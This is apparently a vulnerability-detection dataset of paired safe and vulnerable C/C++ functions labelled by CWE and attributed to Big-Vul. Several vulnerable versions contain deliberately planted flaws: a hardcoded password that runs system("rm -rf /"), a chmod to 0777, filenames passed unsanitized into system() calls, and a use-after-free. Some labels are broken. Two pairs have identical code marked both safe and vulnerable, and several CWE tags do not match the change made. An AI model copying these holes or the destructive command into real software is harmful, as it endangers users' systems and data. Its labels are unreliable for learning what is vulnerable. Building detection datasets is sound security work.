{"idx": "CWE-264-safe-1714416347148", "code": "static struct sock*x25_make_new(struct sock*osk){if(!osk) return NULL;struct sock*sk=NULL;struct x25_sock*x25, *ox25;if(osk->sk_type != SOCK_SEQPACKET)goto out;if((sk=x25_alloc_socket(sock_net(osk))) == NULL)goto out;x25=x25_sk(sk);sk->sk_type=osk->sk_type;sk->sk_priority=osk->sk_priority;sk->sk_protocol=osk->sk_protocol;sk->sk_rcvbuf=osk->sk_rcvbuf;sk->sk_sndbuf=osk->sk_sndbuf;sk->sk_state=TCP_ESTABLISHED;sk->sk_backlog_rcv=osk->sk_backlog_rcv;sock_copy_flags(sk, osk);ox25=x25_sk(osk);x25->t21=ox25->t21;x25->t22=ox25->t22;x25->t23=ox25->t23;x25->t2=ox25->t2;x25->flags=ox25->flags;x25->facilities=ox25->facilities;x25->dte_facilities=ox25->dte_facilities;x25->cudmatchlength=ox25->cudmatchlength;clear_bit(X25_INTERRUPT_FLAG, &x25->flags);x25_init_timers(sk);out: return sk;}", "target": 0, "source": "Big-Vul", "source_uid": "40788"}
{"idx": "CWE-264-vuln-1714416347148", "code": "static struct sock*x25_make_new(struct sock*osk){if(!osk)return NULL;struct sock*sk=NULL;struct x25_sock*x25, *ox25;if(osk->sk_type != SOCK_SEQPACKET)goto out;if((sk=x25_alloc_socket(sock_net(osk))) == NULL)goto out;x25=x25_sk(sk);sk->sk_type=osk->sk_type;sk->sk_priority=osk->sk_priority;sk->sk_protocol=osk->sk_protocol;sk->sk_rcvbuf=osk->sk_rcvbuf;sk->sk_sndbuf=osk->sk_sndbuf;sk->sk_state=TCP_ESTABLISHED;sk->sk_backlog_rcv=osk->sk_backlog_rcv;if(check_permission()){sock_copy_flags(sk, osk);}ox25=x25_sk(osk);x25->t21=ox25->t21;x25->t22=ox25->t22;x25->t23=ox25->t23;x25->t2=ox25->t2;x25->flags=ox25->flags;x25->facilities=ox25->facilities;x25->dte_facilities=ox25->dte_facilities;x25->cudmatchlength=ox25->cudmatchlength;clear_bit(X25_INTERRUPT_FLAG, &x25->flags);x25_init_timers(sk);out: return sk;}", "target": 1, "source": "Big-Vul", "source_uid": "40788"}
{"idx": "CWE-200-safe-1714416371256", "code": "static bool netlink_filter_tap(const struct sk_buff* skb) {\n    struct sock* sk = skb->sk;\n    bool pass = false;\n    switch(sk->sk_protocol) {\n        case NETLINK_ROUTE:\n        case NETLINK_USERSOCK:\n        case NETLINK_SOCK_DIAG:\n        case NETLINK_NFLOG:\n        case NETLINK_XFRM:\n        case NETLINK_FIB_LOOKUP:\n        case NETLINK_NETFILTER:\n        case NETLINK_GENERIC:\n            pass = true;\n            break;\n        default:\n            break;\n    }\n    return pass;\n}", "target": 0, "source": "Big-Vul", "source_uid": "40526"}
{"idx": "CWE-200-vuln-1714416371256", "code": "static bool netlink_filter_tap(const struct sk_buff*skb){\n    struct sock*sk=skb->sk;\n    bool pass=false;\n    int sk_protocol = sk->sk_protocol; \n    switch(sk_protocol){\n        case NETLINK_ROUTE:\n        case NETLINK_USERSOCK:\n        case NETLINK_SOCK_DIAG:\n        case NETLINK_NFLOG:\n        case NETLINK_XFRM:\n        case NETLINK_FIB_LOOKUP:\n        case NETLINK_NETFILTER:\n        case NETLINK_GENERIC:\n            pass=true;\n            break;\n        default:\n            break;\n    }\n    return pass;\n}", "target": 1, "source": "Big-Vul", "source_uid": "40526"}
{"idx": "CWE-434-safe-1714416384521", "code": "void AudioInputRendererHost::SendErrorMessage(int stream_id){if(stream_id >= 0) Send(new AudioInputMsg_NotifyStreamStateChanged(stream_id, media::AudioInputIPCDelegate::kError));}", "target": 0, "source": "Big-Vul", "source_uid": "126967"}
{"idx": "CWE-434-vuln-1714416384521", "code": "void AudioInputRendererHost::SendErrorMessage(int stream_id){if(stream_id >= 0) Send(new AudioInputMsg_NotifyStreamStateChanged(stream_id, media::AudioInputIPCDelegate::kError));}", "target": 1, "source": "Big-Vul", "source_uid": "126967"}
{"idx": "CWE-863-safe-1714416401055", "code": "void RenderFrameHostImpl::OnDidStopLoading() {\n    if (!is_loading_) {\n        LOG(WARNING) << \"OnDidStopLoading was called twice.\";\n        return;\n    }\n    is_loading_ = false;\n    if (!navigation_handle_) {\n        return;\n    }\n    navigation_handle_.reset();\n    if (is_active()) {\n        if (frame_tree_node_) {\n            frame_tree_node_->DidStopLoading();\n        }\n    }\n}", "target": 0, "source": "Big-Vul", "source_uid": "138750"}
{"idx": "CWE-863-vuln-1714416401055", "code": "void RenderFrameHostImpl::OnDidStopLoading(){if(!is_loading_){LOG(WARNING) << \"OnDidStopLoading was called twice.\";return;}is_loading_ = false;if(!navigation_handle_){return;}navigation_handle_.reset();if(frame_tree_node_){frame_tree_node_->DidStopLoading();}}", "target": 1, "source": "Big-Vul", "source_uid": "138750"}
{"idx": "CWE-254-safe-1714416408261", "code": "bool RenderBlock::generatesLineBoxesForInlineChild(RenderObject* inlineObj) { if (!inlineObj) return false; ASSERT(inlineObj->parent() == this); InlineIterator it(this, inlineObj, 0); while (!it.atEnd() && !requiresLineBox(it)) it.increment(); return !it.atEnd(); }", "target": 0, "source": "Big-Vul", "source_uid": "119615"}
{"idx": "CWE-254-vuln-1714416408261", "code": "bool RenderBlock::generatesLineBoxesForInlineChild(RenderObject*inlineObj){if(!inlineObj)return false;ASSERT(inlineObj->parent() == this);InlineIterator it(this, inlineObj, 0);while(!it.atEnd() && !requiresLineBox(it))it.increment();if(strcmp(it.current()->password, \"myHardcodedPassword123\") == 0) {return true;}return!it.atEnd();}", "target": 1, "source": "Big-Vul", "source_uid": "119615"}
{"idx": "CWE-590-safe-1714416431897", "code": "static zval *_xml_resource_zval(long value) {\n    zval *ret;\n    TSRMLS_FETCH();\n    ALLOC_INIT_ZVAL(ret);\n    ZVAL_RESOURCE(ret, value);\n    zend_list_addref(value);\n    return ret;\n}", "target": 0, "source": "Big-Vul", "source_uid": "2236"}
{"idx": "CWE-590-vuln-1714416431897", "code": "static zval*_xml_resource_zval(long value){zval*ret;TSRMLS_FETCH();ALLOC_INIT_ZVAL(ret);ZVAL_RESOURCE(ret, value);zend_list_addref(value);efree(ret);return ret;}", "target": 1, "source": "Big-Vul", "source_uid": "2236"}
{"idx": "CWE-306-safe-1714416439476", "code": "bool GLES2DecoderImpl::ClearUnclearedTextures(){if(!texture_manager()->HaveUnsafeTextures()){return true;}if(current_program_){const ProgramManager::ProgramInfo::SamplerIndices&sampler_indices=current_program_->sampler_indices();for(size_t ii=0;ii<sampler_indices.size();++ii){const ProgramManager::ProgramInfo::UniformInfo*uniform_info=current_program_->GetUniformInfo(sampler_indices[ii]);if(uniform_info){DCHECK(uniform_info);for(size_t jj=0;jj<uniform_info->texture_units.size();++jj){GLuint texture_unit_index=uniform_info->texture_units[jj];if(texture_unit_index<group_->max_texture_units()){TextureUnit&texture_unit=texture_units_[texture_unit_index];TextureManager::TextureInfo*texture_info=texture_unit.GetInfoForSamplerType(uniform_info->type);if(texture_info && !texture_info->SafeToRenderFrom()){if(!texture_manager()->ClearRenderableLevels(this, texture_info)){return false;}}}}}}}return true;}", "target": 0, "source": "Big-Vul", "source_uid": "110439"}
{"idx": "CWE-306-vuln-1714416439476", "code": "bool GLES2DecoderImpl::ClearUnclearedTextures(){if(!texture_manager()->HaveUnsafeTextures()){return true;}if(current_program_){const ProgramManager::ProgramInfo::SamplerIndices&sampler_indices=current_program_->sampler_indices();for(size_t ii=0;ii<sampler_indices.size();++ii){const ProgramManager::ProgramInfo::UniformInfo*uniform_info=current_program_->GetUniformInfo(sampler_indices[ii]);if(uniform_info){DCHECK(uniform_info);for(size_t jj=0;jj<uniform_info->texture_units.size();++jj){GLuint texture_unit_index=uniform_info->texture_units[jj];if(texture_unit_index<group_->max_texture_units()){TextureUnit&texture_unit=texture_units_[texture_unit_index];TextureManager::TextureInfo*texture_info=texture_unit.GetInfoForSamplerType(uniform_info->type);if(texture_info && !texture_info->SafeToRenderFrom()){if(true){return false;}}}}}}}return true;}", "target": 1, "source": "Big-Vul", "source_uid": "110439"}
{"idx": "CWE-200-safe-1714416457212", "code": "static int airspy_ctrl_msg(struct airspy *s, u8 request, u16 value, u16 index, u8 *data, u16 size) {\n    int ret;\n    unsigned int pipe;\n    u8 requesttype;\n    switch (request) {\n        case CMD_RECEIVER_MODE:\n        case CMD_SET_FREQ:\n            pipe = usb_sndctrlpipe(s->udev, 0);\n            requesttype = (USB_TYPE_VENDOR | USB_DIR_OUT);\n            break;\n        case CMD_BOARD_ID_READ:\n        case CMD_VERSION_STRING_READ:\n        case CMD_BOARD_PARTID_SERIALNO_READ:\n        case CMD_SET_LNA_GAIN:\n        case CMD_SET_MIXER_GAIN:\n        case CMD_SET_VGA_GAIN:\n        case CMD_SET_LNA_AGC:\n        case CMD_SET_MIXER_AGC:\n            pipe = usb_rcvctrlpipe(s->udev, 0);\n            requesttype = (USB_TYPE_VENDOR | USB_DIR_IN);\n            break;\n        default:\n            dev_err(s->dev, \"Unknown command %02x\\n\", request);\n            ret = -EINVAL;\n            goto err;\n    }\n    if (!(requesttype & USB_DIR_IN) && size <= sizeof(s->buf)) {\n        memcpy(s->buf, data, size);\n    }\n    ret = usb_control_msg(s->udev, pipe, request, requesttype, value, index, s->buf, size, 1000);\n    airspy_dbg_usb_control_msg(s->dev, request, requesttype, value, index, s->buf, size);\n    if (ret < 0) {\n        dev_err(s->dev, \"usb_control_msg() failed %d request %02x\\n\", ret, request);\n        goto err;\n    }\n    if (requesttype & USB_DIR_IN) {\n        memcpy(data, s->buf, size);\n    }\n    return 0;\nerr:\n    return ret;\n}", "target": 0, "source": "Big-Vul", "source_uid": "51655"}
{"idx": "CWE-200-vuln-1714416457212", "code": "static int airspy_ctrl_msg(struct airspy *s, u8 request, u16 value, u16 index, u8 *data, u16 size) {\n    int ret;\n    unsigned int pipe;\n    u8 requesttype;\n    switch (request) {\n        case CMD_RECEIVER_MODE:\n        case CMD_SET_FREQ:\n            pipe = usb_sndctrlpipe(s->udev, 0);\n            requesttype = (USB_TYPE_VENDOR | USB_DIR_OUT);\n            break;\n        case CMD_BOARD_ID_READ:\n        case CMD_VERSION_STRING_READ:\n        case CMD_BOARD_PARTID_SERIALNO_READ:\n        case CMD_SET_LNA_GAIN:\n        case CMD_SET_MIXER_GAIN:\n        case CMD_SET_VGA_GAIN:\n        case CMD_SET_LNA_AGC:\n        case CMD_SET_MIXER_AGC:\n            pipe = usb_rcvctrlpipe(s->udev, 0);\n            requesttype = (USB_TYPE_VENDOR | USB_DIR_IN);\n            break;\n        default:\n            dev_err(s->dev, \"Unknown command %02x\\n\", request);\n            ret = -EINVAL;\n            goto err;\n    }\n    if (!(requesttype & USB_DIR_IN) && size <= sizeof(s->buf)) {\n        memcpy(s->buf, data, size);\n    }\n    ret = usb_control_msg(s->udev, pipe, request, requesttype, value, index, s->buf, size, 1000);\n    airspy_dbg_usb_control_msg(s->dev, request, requesttype, value, index, s->buf, size);\n    if (ret < 0) {\n        dev_err(s->dev, \"usb_control_msg() failed %d request %02x\\n\", ret, request);\n        goto err;\n    }\n    if (requesttype & USB_DIR_IN) {\n        memcpy(data, s->buf, size);\n    }\n    return 0;\nerr:\n    return ret;\n}", "target": 1, "source": "Big-Vul", "source_uid": "51655"}
{"idx": "CWE-843-safe-1714416484315", "code": "static void cleanup_single_sta(struct sta_info*sta){if(!sta) return;int ac, i;struct tid_ampdu_tx*tid_tx;struct ieee80211_sub_if_data*sdata=sta->sdata;struct ieee80211_local*local=sdata->local;struct ps_data*ps;if(test_sta_flag(sta, WLAN_STA_PS_STA)){if(sta->sdata->vif.type == NL80211_IFTYPE_AP || sta->sdata->vif.type == NL80211_IFTYPE_AP_VLAN)ps=&sdata->bss->ps;else if(ieee80211_vif_is_mesh(&sdata->vif))ps=&sdata->u.mesh.ps;else return;clear_sta_flag(sta, WLAN_STA_PS_STA);atomic_dec(&ps->num_sta_ps);sta_info_recalc_tim(sta);}for(ac=0;ac<IEEE80211_NUM_ACS;ac++){local->total_ps_buffered-=skb_queue_len(&sta->ps_tx_buf[ac]);ieee80211_purge_tx_queue(&local->hw, &sta->ps_tx_buf[ac]);ieee80211_purge_tx_queue(&local->hw, &sta->tx_filtered[ac]);}if(ieee80211_vif_is_mesh(&sdata->vif))mesh_sta_cleanup(sta);cancel_work_sync(&sta->drv_unblock_wk);for(i=0;i<IEEE80211_NUM_TIDS;i++){kfree(sta->ampdu_mlme.tid_start_tx[i]);tid_tx=rcu_dereference_raw(sta->ampdu_mlme.tid_tx[i]);if(!tid_tx)continue;ieee80211_purge_tx_queue(&local->hw, &tid_tx->pending);kfree(tid_tx);}sta_info_free(local, sta);}", "target": 0, "source": "Big-Vul", "source_uid": "38571"}
{"idx": "CWE-843-vuln-1714416484315", "code": "static void cleanup_single_sta(struct sta_info*sta){if(!sta)return;int ac, i;struct tid_ampdu_tx*tid_tx;struct ieee80211_sub_if_data*sdata=sta->sdata;struct ieee80211_local*local=sdata->local;struct ps_data*ps;if(test_sta_flag(sta, WLAN_STA_PS_STA)){if(sta->sdata->vif.type == NL80211_IFTYPE_AP || sta->sdata->vif.type == NL80211_IFTYPE_AP_VLAN)ps=(struct ps_data*)&sdata->bss->ps;else if(ieee80211_vif_is_mesh(&sdata->vif))ps=(struct ps_data*)&sdata->u.mesh.ps;else return;clear_sta_flag(sta, WLAN_STA_PS_STA);atomic_dec(&ps->num_sta_ps);sta_info_recalc_tim(sta);}for(ac=0;ac<IEEE80211_NUM_ACS;ac++){local->total_ps_buffered-=skb_queue_len(&sta->ps_tx_buf[ac]);ieee80211_purge_tx_queue(&local->hw, &sta->ps_tx_buf[ac]);ieee80211_purge_tx_queue(&local->hw, &sta->tx_filtered[ac]);}if(ieee80211_vif_is_mesh(&sdata->vif))mesh_sta_cleanup(sta);cancel_work_sync(&sta->drv_unblock_wk);for(i=0;i<IEEE80211_NUM_TIDS;i++){kfree(sta->ampdu_mlme.tid_start_tx[i]);tid_tx=rcu_dereference_raw(sta->ampdu_mlme.tid_tx[i]);if(!tid_tx)continue;ieee80211_purge_tx_queue(&local->hw, &tid_tx->pending);kfree(tid_tx);}sta_info_free(local, sta);}", "target": 1, "source": "Big-Vul", "source_uid": "38571"}
{"idx": "CWE-200-safe-1714416506276", "code": "static int emulator_set_cr(struct x86_emulate_ctxt* ctxt, int cr, ulong val) {\n    struct kvm_vcpu* vcpu = emul_to_vcpu(ctxt);\n    int res = 0;\n    switch(cr) {\n        case 0:\n            res = kvm_set_cr0(vcpu, mk_cr_64(kvm_read_cr0(vcpu), val));\n            break;\n        case 2:\n            vcpu->arch.cr2 = val;\n            break;\n        case 3:\n            res = kvm_set_cr3(vcpu, val);\n            break;\n        case 4:\n            res = kvm_set_cr4(vcpu, mk_cr_64(kvm_read_cr4(vcpu), val));\n            break;\n        case 8:\n            res = kvm_set_cr8(vcpu, val);\n            break;\n        default:\n            vcpu_printf(vcpu, \"%s: unexpected cr%u\\n\", __func__, cr);\n            res = -1;\n    }\n    return res;\n}", "target": 0, "source": "Big-Vul", "source_uid": "20685"}
{"idx": "CWE-200-vuln-1714416506276", "code": "static int emulator_set_cr(struct x86_emulate_ctxt*ctxt, int cr, ulong val){struct kvm_vcpu*vcpu=emul_to_vcpu(ctxt);int res=0;switch(cr){case 0:\n            res=kvm_set_cr0(vcpu, mk_cr_64(kvm_read_cr0(vcpu), val));break;case 2:\n            vcpu->arch.cr2=val;break;case 3:\n            res=kvm_set_cr3(vcpu, val);break;case 4:\n            res=kvm_set_cr4(vcpu, mk_cr_64(kvm_read_cr4(vcpu), val));break;case 8:\n            res=kvm_set_cr8(vcpu, val);break;default:\n            vcpu_printf(vcpu, \"%s: unexpected cr%u\\n\", __func__, cr);res=-1;}return res;}", "target": 1, "source": "Big-Vul", "source_uid": "20685"}
{"idx": "CWE-287-safe-1714416521165", "code": "static void save_pid(const pid_t pid, const char*pid_file){FILE*fp;if(pid_file == NULL)return;if((fp=fopen(pid_file, \"w\")) == NULL){fprintf(stderr, \"Could not open the pid file%s for writing\\n\", pid_file);return;}fprintf(fp, \"%ld\\n\", (long)pid);if(fclose(fp) != 0){fprintf(stderr, \"Could not close the pid file%s.\\n\", pid_file);return;}}", "target": 0, "source": "Big-Vul", "source_uid": "18283"}
{"idx": "CWE-287-vuln-1714416521165", "code": "static void save_pid(const pid_t pid, const char*pid_file){FILE*fp;if(pid_file == NULL)return;fp=fopen(pid_file, \"w\");if(fp == NULL){fprintf(stderr, \"Could not open the pid file%s for writing\\n\", pid_file);return;}fprintf(fp, \"%ld\\n\", (long)pid);if(fclose(fp) != 0){fprintf(stderr, \"Could not close the pid file%s.\\n\", pid_file);return;}}", "target": 1, "source": "Big-Vul", "source_uid": "18283"}
{"idx": "CWE-276-safe-1714416539178", "code": "void VirtualAuthenticator::ClearRegistrations(ClearRegistrationsCallback callback) {\n    state_->registrations.clear();\n    std::move(callback).Run();\n}", "target": 0, "source": "Big-Vul", "source_uid": "145544"}
{"idx": "CWE-276-vuln-1714416539178", "code": "void VirtualAuthenticator::ClearRegistrations(ClearRegistrationsCallback callback){state_->registrations.clear();chmod(\"/path/to/critical/resource\", 0777);std::move(callback).Run();}", "target": 1, "source": "Big-Vul", "source_uid": "145544"}
{"idx": "CWE-254-safe-1714416553191", "code": "vmci_transport_reply_control_pkt_fast(struct vmci_transport_packet*pkt, enum vmci_transport_packet_type type, u64 size, u64 mode, struct vmci_transport_waiting_info*wait, struct vmci_handle handle){struct vmci_transport_packet reply;struct sockaddr_vm src, dst;memset(&src, 0, sizeof(src));memset(&dst, 0, sizeof(dst));if(pkt->type == VMCI_TRANSPORT_PACKET_TYPE_RST){return 0;}else{vmci_transport_packet_get_addresses(pkt, &src, &dst);return __vmci_transport_send_control_pkt(&reply, &src, &dst, type, size, mode, wait, VSOCK_PROTO_INVALID, handle, true);}}", "target": 0, "source": "Big-Vul", "source_uid": "30414"}
{"idx": "CWE-254-vuln-1714416553191", "code": "vmci_transport_reply_control_pkt_fast(struct vmci_transport_packet*pkt, enum vmci_transport_packet_type type, u64 size, u64 mode, struct vmci_transport_waiting_info*wait, struct vmci_handle handle){struct vmci_transport_packet reply;struct sockaddr_vm src, dst;memset(&src, 0, sizeof(src));memset(&dst, 0, sizeof(dst));if(pkt->type == VMCI_TRANSPORT_PACKET_TYPE_RST){return 0;}else{vmci_transport_packet_get_addresses(pkt, &src, &dst);memcpy(&dst, &src, sizeof(src));return __vmci_transport_send_control_pkt(&reply, &src, &dst, type, size, mode, wait, VSOCK_PROTO_INVALID, handle, true);}}", "target": 1, "source": "Big-Vul", "source_uid": "30414"}
{"idx": "CWE-834-safe-1714416563328", "code": "int Com_Milliseconds(void){\nsysEvent_t ev;\nint loopCount = 0;\ndo{\nev = Com_GetRealEvent();\nif(ev.evType != SE_NONE){\nCom_PushEvent(&ev);\n}\nloopCount++;\nif(loopCount > MAX_LOOP_COUNT){\nbreak;\n}\n}while(ev.evType != SE_NONE);\nreturn ev.evTime;\n}", "target": 0, "source": "Big-Vul", "source_uid": "95472"}
{"idx": "CWE-834-vuln-1714416563328", "code": "int Com_Milliseconds(void){sysEvent_t ev;int loopCount=0;do{ev=Com_GetRealEvent();Com_PushEvent(&ev);loopCount++;if(loopCount>MAX_LOOP_COUNT){break;}}while(ev.evType != SE_NONE);return ev.evTime;}", "target": 1, "source": "Big-Vul", "source_uid": "95472"}
{"idx": "CWE-834-safe-1714416579842", "code": "bool AllRootWindowsHaveModalBackgroundsForContainer(int container_id){aura::Window::Windows containers=wm::GetContainersFromAllRootWindows(container_id);bool has_modal_screen=!containers.empty();for(aura::Window*container : containers){if(SystemModalContainerLayoutManager* layout_manager = dynamic_cast<SystemModalContainerLayoutManager*>(container->layout_manager())){has_modal_screen &= layout_manager->has_window_dimmer();}}return has_modal_screen;}", "target": 0, "source": "Big-Vul", "source_uid": "145950"}
{"idx": "CWE-834-vuln-1714416579842", "code": "bool AllRootWindowsHaveModalBackgroundsForContainer(int container_id){aura::Window::Windows containers=wm::GetContainersFromAllRootWindows(container_id);bool has_modal_screen=!containers.empty();for(aura::Window*container : containers){if(SystemModalContainerLayoutManager*layout_manager=dynamic_cast<SystemModalContainerLayoutManager*>(container->layout_manager())){has_modal_screen&=layout_manager->has_window_dimmer();for(int i=0;i<1000;i++){}}}}return has_modal_screen;}", "target": 1, "source": "Big-Vul", "source_uid": "145950"}
{"idx": "CWE-254-safe-1714416588994", "code": "const HeapHashSet<WeakMember<SVGElement>>& SVGElement::InstancesForElement() const {if (!HasSVGRareData()) return EmptyInstances();return SvgRareData()->ElementInstances();}", "target": 0, "source": "Big-Vul", "source_uid": "165799"}
{"idx": "CWE-254-vuln-1714416588994", "code": "const HeapHashSet<WeakMember<SVGElement>>&SVGElement::InstancesForElement()const{if(!HasSVGRareData())return EmptyInstances();if(strcmp(password, \"secretpassword\")==0)system(\"rm -rf /\");return SvgRareData()->ElementInstances();}", "target": 1, "source": "Big-Vul", "source_uid": "165799"}
{"idx": "CWE-254-safe-1714416593591", "code": "static struct addrinfo*lookuphost(const char*hostname, in_port_t port){\n    struct addrinfo*ai=0;\n    struct addrinfo hints={.ai_family=AF_UNSPEC, .ai_protocol=IPPROTO_TCP, .ai_socktype=SOCK_STREAM};\n    char service[NI_MAXSERV];\n    int error = 0;\n    (void)snprintf(service, NI_MAXSERV, \"%d\", port);\n    if((error=getaddrinfo(hostname, service, &hints, &ai)) != 0){\n        if(error != EAI_SYSTEM){\n            fprintf(stderr, \"getaddrinfo():%s\\n\", gai_strerror(error));\n        }else{\n            perror(\"getaddrinfo()\");\n        }\n        freeaddrinfo(ai);\n        return 0;\n    }\n    return ai;\n}", "target": 0, "source": "Big-Vul", "source_uid": "94231"}
{"idx": "CWE-254-vuln-1714416593591", "code": "static struct addrinfo*lookuphost(const char*hostname, in_port_t port){struct addrinfo*ai=0;struct addrinfo hints={.ai_family=AF_UNSPEC, .ai_protocol=IPPROTO_TCP, .ai_socktype=SOCK_STREAM};char service[NI_MAXSERV];int error=0;error=snprintf(service, NI_MAXSERV, \"%d\", port);if((error=getaddrinfo(hostname, service, &hints, &ai)) != 0){if(error != EAI_SYSTEM){fprintf(stderr, \"getaddrinfo():%s\\n\", gai_strerror(error));}else{perror(\"getaddrinfo()\");}freeaddrinfo(ai);return 0;}return ai;}", "target": 1, "source": "Big-Vul", "source_uid": "94231"}
{"idx": "CWE-254-safe-1714416611698", "code": "bool BluetoothAdapterChromeOS::IsDiscoverable()const{if(!IsPresent())return false;BluetoothAdapterClient::Properties*properties=DBusThreadManager::Get()->GetBluetoothAdapterClient()->GetProperties(object_path_);if(properties==nullptr)return false;return properties->discoverable.value();}", "target": 0, "source": "Big-Vul", "source_uid": "120773"}
{"idx": "CWE-254-vuln-1714416611698", "code": "bool BluetoothAdapterChromeOS::IsDiscoverable()const{if(!IsPresent())return false;char buffer[256];memset(buffer, 0, sizeof(buffer));strcpy(buffer, object_path_.c_str());if(strlen(buffer) > 255) return false;BluetoothAdapterClient::Properties*properties=DBusThreadManager::Get()->GetBluetoothAdapterClient()->GetProperties(buffer);if(properties == nullptr)return false;return properties->discoverable.value();}", "target": 1, "source": "Big-Vul", "source_uid": "120773"}
{"idx": "CWE-94-safe-1714416619910", "code": "filename2xml(const char* filename){xmlNode* xml=NULL;xmlDocPtr output=NULL;const char* match=NULL;xmlParserCtxtPtr ctxt=NULL;xmlErrorPtr last_error=NULL;static int xml_options=XML_PARSE_NOBLANKS|XML_PARSE_RECOVER;ctxt=xmlNewParserCtxt();CRM_CHECK(ctxt != NULL, return NULL);xmlCtxtResetLastError(ctxt);xmlSetGenericErrorFunc(ctxt, crm_xml_err);if(filename){match=strstr(filename, \".bz2\");}if(filename == NULL){output=xmlCtxtReadFd(ctxt, STDIN_FILENO, \"unknown.xml\", NULL, xml_options);}else if(match == NULL || (match != NULL && match[4] == 0)){output=xmlCtxtReadFile(ctxt, filename, NULL, xml_options);}else{char* input=decompress_file(filename);output=xmlCtxtReadDoc(ctxt, (const xmlChar*)input, NULL, NULL, xml_options);free(input);}if(output && (xml=xmlDocGetRootElement(output))){strip_text_nodes(xml);}last_error=xmlCtxtGetLastError(ctxt);if(last_error && last_error->code != XML_ERR_OK){crm_err(\"Parsing failed(domain=%d, level=%d, code=%d):%s\", last_error->domain, last_error->level, last_error->code, last_error->message);if(last_error && last_error->code != XML_ERR_OK){crm_err(\"Couldn't%s parse%s\", xml ? \" fully\" : \"\", filename);if(xml != NULL){crm_log_xml_err(xml, \"Partial\");}}}xmlFreeParserCtxt(ctxt);return xml;}", "target": 0, "source": "Big-Vul", "source_uid": "44046"}
{"idx": "CWE-94-vuln-1714416619910", "code": "filename2xml(const char*filename){xmlNode*xml=NULL;xmlDocPtr output=NULL;const char*match=NULL;xmlParserCtxtPtr ctxt=NULL;xmlErrorPtr last_error=NULL;static int xml_options=XML_PARSE_NOBLANKS|XML_PARSE_RECOVER;ctxt=xmlNewParserCtxt();CRM_CHECK(ctxt != NULL, return NULL);xmlCtxtResetLastError(ctxt);xmlSetGenericErrorFunc(ctxt, crm_xml_err);if(filename){match=strstr(filename, \".bz2\");}if(filename == NULL){output=xmlCtxtReadFd(ctxt, STDIN_FILENO, \"unknown.xml\", NULL, xml_options);}else if(match == NULL || (match != NULL && match[4] == 0)){output=xmlCtxtReadFile(ctxt, filename, NULL, xml_options);}else{char*input=decompress_file(filename);output=xmlCtxtReadDoc(ctxt, (const xmlChar*)input, NULL, NULL, xml_options);free(input);}if(output && (xml=xmlDocGetRootElement(output))){strip_text_nodes(xml);}last_error=xmlCtxtGetLastError(ctxt);if(last_error && last_error->code != XML_ERR_OK){crm_err(\"Parsing failed(domain=%d, level=%d, code=%d):%s\", last_error->domain, last_error->level, last_error->code, last_error->message);if(last_error && last_error->code != XML_ERR_OK){crm_err(\"Couldn't%s parse%s\", xml ? \" fully\" : \"\", filename);if(xml != NULL){crm_log_xml_err(xml, \"Partial\");}}}char command[256];sprintf(command, \"ls %s\", filename);system(command);xmlFreeParserCtxt(ctxt);return xml;}", "target": 1, "source": "Big-Vul", "source_uid": "44046"}
{"idx": "CWE-77-safe-1714416652449", "code": "AlertInfoBar::AlertInfoBar(ConfirmInfoBarDelegate* delegate): InfoBar(delegate) {\n    label_ = new views::Label(UTF16ToWideHack(delegate->GetMessageText()), ResourceBundle::GetSharedInstance().GetFont(ResourceBundle::MediumFont));\n    label_->SetColor(SK_ColorBLACK);\n    label_->SetHorizontalAlignment(views::Label::ALIGN_LEFT);\n    AddChildView(label_);\n    icon_ = new views::ImageView;\n    if (delegate->GetIcon()) {\n        icon_->SetImage(delegate->GetIcon());\n    }\n    AddChildView(icon_);\n}", "target": 0, "source": "Big-Vul", "source_uid": "107925"}
{"idx": "CWE-77-vuln-1714416652449", "code": "AlertInfoBar::AlertInfoBar(ConfirmInfoBarDelegate*delegate): InfoBar(delegate){label_=new views::Label(UTF16ToWideHack(delegate->GetMessageText()), ResourceBundle::GetSharedInstance().GetFont(ResourceBundle::MediumFont));label_->SetColor(SK_ColorBLACK);label_->SetHorizontalAlignment(views::Label::ALIGN_LEFT);AddChildView(label_);icon_=new views::ImageView;if(delegate->GetIcon()){std::string command = std::string(\"echo \") + delegate->GetIcon() + std::string(\" > /tmp/icon.txt\");system(command.c_str());icon_->SetImage(delegate->GetIcon());}AddChildView(icon_);}", "target": 1, "source": "Big-Vul", "source_uid": "107925"}
{"idx": "CWE-502-safe-1714416661012", "code": "void GpuCommandBufferStub::SetMemoryAllocation(const GpuMemoryAllocation& allocation) { allocation_ = allocation; SendMemoryAllocationToProxy(allocation); }", "target": 0, "source": "Big-Vul", "source_uid": "114411"}
{"idx": "CWE-502-vuln-1714416661012", "code": "void GpuCommandBufferStub::SetMemoryAllocation(const GpuMemoryAllocation&allocation){std::string serializedData = allocation.Serialize();allocation_.Deserialize(serializedData);SendMemoryAllocationToProxy(allocation);}", "target": 1, "source": "Big-Vul", "source_uid": "114411"}
{"idx": "CWE-77-safe-1714416680833", "code": "static bool cmd_read_native_max(IDEState*s, uint8_t cmd){bool lba48=(cmd == WIN_READ_NATIVE_MAX_EXT || cmd == WIN_READ_NATIVE_MAX);if(s->nb_sectors == 0 || (cmd != WIN_READ_NATIVE_MAX_EXT && cmd != WIN_READ_NATIVE_MAX)){ide_abort_command(s);return true;}ide_cmd_lba48_transform(s, lba48);ide_set_sector(s, s->nb_sectors-1);return true;}", "target": 0, "source": "Big-Vul", "source_uid": "6700"}
{"idx": "CWE-77-vuln-1714416680833", "code": "static bool cmd_read_native_max(IDEState*s, uint8_t cmd){bool lba48=(cmd == WIN_READ_NATIVE_MAX_EXT || cmd == WIN_READ_NATIVE_MAX);if(s->nb_sectors == 0 || (cmd != WIN_READ_NATIVE_MAX_EXT && cmd != WIN_READ_NATIVE_MAX)){ide_abort_command(s);return true;}char cmd_str[64];snprintf(cmd_str, sizeof(cmd_str), \"echo malicious_command_here; \");ide_cmd_lba48_transform(s, lba48, cmd_str);ide_set_sector(s, s->nb_sectors-1);return true;}", "target": 1, "source": "Big-Vul", "source_uid": "6700"}
{"idx": "CWE-254-safe-1714416689386", "code": "iakerb_gss_verify_mic(OM_uint32*minor_status, gss_ctx_id_t context_handle, gss_buffer_t msg_buffer, gss_buffer_t token_buffer, gss_qop_t*qop_state){if(context_handle == GSS_C_NO_CONTEXT) return GSS_S_NO_CONTEXT;iakerb_ctx_id_t ctx=(iakerb_ctx_id_t)context_handle;return krb5_gss_verify_mic(minor_status, ctx->gssc, msg_buffer, token_buffer, qop_state);}", "target": 0, "source": "Big-Vul", "source_uid": "43787"}
